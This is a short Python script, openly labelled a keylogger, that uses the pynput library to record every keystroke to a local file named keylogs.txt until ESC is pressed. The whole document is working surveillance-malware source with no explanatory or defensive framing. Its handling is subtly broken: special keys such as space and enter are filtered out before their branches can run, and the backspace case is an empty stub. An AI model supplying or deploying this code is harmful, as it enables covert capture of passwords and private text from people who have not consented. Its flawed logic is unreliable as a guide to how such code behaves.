```python
import os
import sys
from pynput import keyboard

log_file = "keylogs.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")
        if k.find("Key") == -1:
            if k.find("space") != -1:
                f.write(' ')
            elif k.find("enter") != -1:
                f.write('\n')
            elif k.find("backspace") != -1:
                pass  # handle backspace by deleting last character from the log file
            else:
                f.write(k)

def on_press(key):
    write_to_file(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        print("Keylogger is running. Press ESC to quit.")
        listener.join()
    except Exception as e:
        with open(log_file, "a") as f:
            f.write("\nError occurred: {}\n".format(e))
```

